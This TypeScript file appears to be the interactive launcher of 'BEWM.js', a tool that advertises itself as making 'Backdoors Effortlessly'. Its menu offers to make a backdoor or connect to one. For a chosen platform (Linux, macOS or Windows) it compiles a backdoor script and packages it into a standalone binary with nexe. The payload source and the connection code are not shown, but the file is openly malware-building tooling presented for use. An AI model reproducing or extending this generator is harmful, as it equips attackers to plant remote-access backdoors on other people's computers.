/* eslint-disable @typescript-eslint/ban-ts-ignore */
// import ascii from 'ascii-art';
import boxen from 'boxen';
import 'colors';
// @ts-ignore
import {select} from 'input';
import {exec} from 'child-process-promise';
import cwd from 'cwd';
import {compile} from 'nexe';
import {windowClear} from './helpers';
// ████████████████████████
// ████████████████████████
// ████████████████████████
// ████████████████████████
// ████████████████████████
// ██████████  ████    ████   big thanks to the creator of this
// ██████████  ██  ████████   guy, great language :DDDD
// ██████████  ████    ████
// ██████████  ████████  ██
// ██████████  ██  ████  ██
// ██████    ██████    ████
// ████████████████████████
windowClear();
(async () => {
  console.log(
    `+-------------------------------------------------+
|                                                 |
|                                                 |
|       ____  _______        ____  __             |
|      | __ )| ____\\ \\      / |  \\/  |            |
|      |  _ \\|  _|  \\ \\ /\\ / /| |\\/| |            |
|      | |_) | |___  \\ V  V / | |  | |            |
|      |____/|_____|  \\_/\\_/  |_|  |_|.js         |
|                                                 |
|        Backdoors Effortlessly, With             |
|        Mainly JavaScript.                       |
|                                                 |
|                                                 |
|                                                 |
|                                                 |
|                                                 |
|                                       Jabster28 |
+-------------------------------------------------+
`.blue
  );
  console.log('\n\n');
  select("So, what's tickling your fancy today?", [
    'Make a backdoor',
    'Already made a backdoor? Connect to it now',
    'Config',
  ]).then(async (e: string) => {
    switch (e) {
      case 'Make a backdoor':
        select('What architecture do you want to target?', [
          'linux',
          'darwin',
          'windows',
        ]).then(async (a: string) => {
          console.log(boxen('Compiling TS backdoor to JS...').gray);
          try {
            await exec('tsc');
            console.log(boxen('Done!').green);
          } catch (error) {
            console.log(boxen('ERROR!!!').red);
            console.error(error);
          }
          console.log(
            boxen(
              'Packaging JS backdoor to binary... (may take a while, please be patient!)'
            ).gray + '\n'
          );
          try {
            compile({
              targets: [a],
              input: cwd() + `/build/${a}.js`,
              output: 'build/' + a,
            });
          } catch (error) {
            console.log(boxen('ERROR!!!').red);
            console.error(error);
          }
        });
        break;

      default:
        console.log('dafuq iz dis');
        break;
    }
  });
})();
